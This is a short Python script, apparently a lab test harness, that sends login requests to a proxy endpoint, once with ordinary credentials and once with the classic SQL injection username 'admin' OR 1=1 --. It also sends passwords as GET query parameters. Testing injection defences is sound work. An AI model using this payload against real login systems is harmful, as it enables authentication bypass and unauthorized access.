import requests  # Imports the 'requests' library for making HTTP requests

# The endpoint URL for login functionality via a proxy server
PROXY_URL = "http://proxy:8000/login"

# Function to test login by sending a GET request with provided credentials
def test_login(username, password):
    params = {'username': username, 'password': password}  # Query parameters for the login request
    response = requests.get(PROXY_URL, params=params)  # Sends the GET request with credentials
    print(f"[{username} | {password}] → {response.status_code} | {response.text.strip()}")  # Prints the response status and content

# Main function to test both normal and SQL injection login attempts
def main():
    print("Testing normal login:")
    test_login("admin", "adminpass")  # Test with valid credentials
    
    print("\nTesting SQL injection:")
    test_login("admin' OR 1=1 --", "anything")  # Simulated SQL injection attack

# Script entry point
if __name__ == "__main__":
    main()

